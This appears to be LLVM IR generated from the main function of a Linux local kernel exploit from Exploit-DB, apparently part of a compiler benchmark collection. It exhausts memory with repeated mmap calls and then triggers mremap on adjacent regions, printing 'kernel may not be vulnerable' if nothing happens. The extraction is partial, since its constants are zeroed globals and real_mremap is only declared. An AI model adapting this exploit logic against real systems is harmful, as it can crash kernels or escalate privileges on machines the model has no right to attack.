; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_154.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_154.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@VMA_SIZE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@.str.1 = private unnamed_addr constant [18 x i8] c"created ~%d VMAs\0A\00", align 1
@.str.2 = private unnamed_addr constant [33 x i8] c"now mremapping 0x%08X at 0x%08X\0A\00", align 1
@MREMAP_FLAGS = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [30 x i8] c"kernel may not be vulnerable\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  br label %6

6:                                                ; preds = %0, %28
  %7 = load i32, i32* %2, align 4
  %8 = add nsw i32 %7, 1
  store i32 %8, i32* %2, align 4
  %9 = load i32, i32* %2, align 4
  %10 = load i32, i32* @VMA_SIZE, align 4
  %11 = add nsw i32 %10, 4096
  %12 = mul nsw i32 %9, %11
  %13 = sext i32 %12 to i64
  %14 = inttoptr i64 %13 to i8*
  %15 = load i32, i32* @VMA_SIZE, align 4
  %16 = load i32, i32* @PROT_READ, align 4
  %17 = load i32, i32* @PROT_WRITE, align 4
  %18 = or i32 %16, %17
  %19 = load i32, i32* @MAP_PRIVATE, align 4
  %20 = load i32, i32* @MAP_ANONYMOUS, align 4
  %21 = or i32 %19, %20
  %22 = call i64 @mmap(i8* %14, i32 %15, i32 %18, i32 %21, i32 0, i32 0)
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %3, align 4
  %24 = load i32, i32* %3, align 4
  %25 = icmp eq i32 %24, -1
  br i1 %25, label %26, label %28

26:                                               ; preds = %6
  %27 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  br label %33

28:                                               ; preds = %6
  %29 = load i8*, i8** %5, align 8
  store i8* %29, i8** %4, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = inttoptr i64 %31 to i8*
  store i8* %32, i8** %5, align 8
  br label %6

33:                                               ; preds = %26
  %34 = load i32, i32* %2, align 4
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0), i32 %34)
  %36 = load i8*, i8** %4, align 8
  %37 = getelementptr i8, i8* %36, i64 4096
  store i8* %37, i8** %4, align 8
  %38 = load i8*, i8** %5, align 8
  %39 = getelementptr i8, i8* %38, i64 4096
  store i8* %39, i8** %5, align 8
  %40 = load i8*, i8** %5, align 8
  %41 = ptrtoint i8* %40 to i32
  %42 = load i8*, i8** %4, align 8
  %43 = ptrtoint i8* %42 to i32
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0), i32 %41, i32 %43)
  %45 = load i8*, i8** %5, align 8
  %46 = load i32, i32* @MREMAP_FLAGS, align 4
  %47 = load i8*, i8** %4, align 8
  %48 = call i32 @real_mremap(i8* %45, i32 4096, i32 4096, i32 %46, i8* %47)
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0))
  ret i32 0
}

declare dso_local i64 @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @real_mremap(i8*, i32, i32, i32, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
